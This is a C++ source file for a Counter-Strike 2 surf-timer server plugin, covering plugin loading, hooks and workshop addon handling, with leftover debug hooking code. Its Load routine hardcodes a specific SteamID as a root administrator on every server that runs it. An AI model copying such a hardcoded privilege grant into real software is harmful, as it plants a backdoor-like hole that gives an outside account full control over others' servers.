#include "cs2surf.h"
#include "version.h"

#include <sdk/entity/cgameresourceservice.h>

#include <core/interfaces.h>
#include <core/memory.h>
#include <core/gamedata.h>
#include <core/cvarmanager.h>
#include <core/logger.h>
#include <core/gamesystem.h>
#include <core/adminmanager.h>

#include <movement/movement.h>

#include <utils/utils.h>

#include <surf/api.h>

#include <vendor/MultiAddonManager/public/imultiaddonmanager.h>

#include <safetyhook.hpp>
#include <Zydis/Zydis.h>

IMultiAddonManager* g_pMultiAddonManager;

CSurfPlugin g_SurfPlugin;

PLUGIN_EXPOSE(CSurfPlugin, g_SurfPlugin);

CSurfPlugin* SurfPlugin() {
	return &g_SurfPlugin;
}

SafetyHookInline g_HkSurfPlugin {};

CSurfPlugin* HkSurfPlugin() {
	return g_HkSurfPlugin.call<CSurfPlugin*>();
}

SAFETYHOOK_NOINLINE int add_42(int a) {
	return a + 42;
}

void hooked_add_42(SafetyHookContext& ctx) {
	ctx.rax = 1337;
}

bool CSurfPlugin::Load(PluginId id, ISmmAPI* ismm, char* error, size_t maxlen, bool late) {
	PLUGIN_SAVEVARS();

	GAMEDATA::Append("cs2surf-core.games.jsonc");

	IFACE::Setup(ismm, error, maxlen);

	LOG::Setup(0x00FFFF);

	MEM::MODULE::Setup();
	GS::Setup();
	UTIL::UnlockConVars();
	UTIL::UnlockConCommands();

	g_SMAPI->AddListener(this, this);

	g_HkSurfPlugin = safetyhook::create_inline(SurfPlugin, HkSurfPlugin);

	ZydisDecoder decoder {};
	ZydisDecoderInit(&decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);

	auto ip = reinterpret_cast<uint8_t*>(add_42);

	while (*ip != 0xC3) {
		ZydisDecodedInstruction ix {};

		ZydisDecoderDecodeInstruction(&decoder, nullptr, reinterpret_cast<void*>(ip), 15, &ix);

		// Follow JMPs
		if (ix.opcode == 0xE9) {
			ip += ix.length + (int32_t)ix.raw.imm[0].value.s;
		} else {
			ip += ix.length;
		}
	}

	auto hHook = safetyhook::create_mid(ip, hooked_add_42);

	ADMIN::AddAdmin(76561198083290027, AdminFlag::Root);

	return true;
}

void CSurfPlugin::AllPluginsLoaded() {
	IFACE::PostSetup();
	MEM::SetupHooks();
	MOVEMENT::SetupHooks();

	g_pMultiAddonManager = (IMultiAddonManager*)g_SMAPI->MetaFactory(MULTIADDONMANAGER_INTERFACE, nullptr, nullptr);

	FORWARD_POST(CCoreForward, OnPluginStart);

	ConVar_Register();
}

void CSurfPlugin::OnLevelInit(char const* pMapName, char const* pMapEntities, char const* pOldLevel, char const* pLandmarkName, bool loadGame, bool background) {
	m_sCurrentMap = pMapName;

	FORWARD_POST(CCoreForward, OnLevelInit, pMapName);
}

void CSurfPlugin::AddonInit() {
	static bool addonLoaded;
	if (g_pMultiAddonManager != nullptr && !addonLoaded) {
		g_pMultiAddonManager->AddAddon(SURF_WORKSHOP_ADDONS_ID);
		g_pMultiAddonManager->RefreshAddons();
		addonLoaded = true;
	}
}

bool CSurfPlugin::IsAddonMounted() {
	if (g_pMultiAddonManager != nullptr) {
		return g_pMultiAddonManager->IsAddonMounted(SURF_WORKSHOP_ADDONS_ID);
	}
	return false;
}

const char* CSurfPlugin::GetAuthor() {
	return "Nyano1337";
}

const char* CSurfPlugin::GetName() {
	return "CS2-SurfTimer";
}

const char* CSurfPlugin::GetDescription() {
	return "WIP";
}

const char* CSurfPlugin::GetURL() {
	return " https://cs2surf.com";
}

const char* CSurfPlugin::GetLicense() {
	return "MIT License";
}

const char* CSurfPlugin::GetVersion() {
	return "dev"; // VERSION_STRING
}

const char* CSurfPlugin::GetDate() {
	return "1337"; // VERSION_DATE_STRING
}

const char* CSurfPlugin::GetLogTag() {
	return nullptr;
}

class CGameEntitySystem;

CGameEntitySystem* GameEntitySystem() {
	return IFACE::pGameResourceServiceServer->GetGameEntitySystem();
}
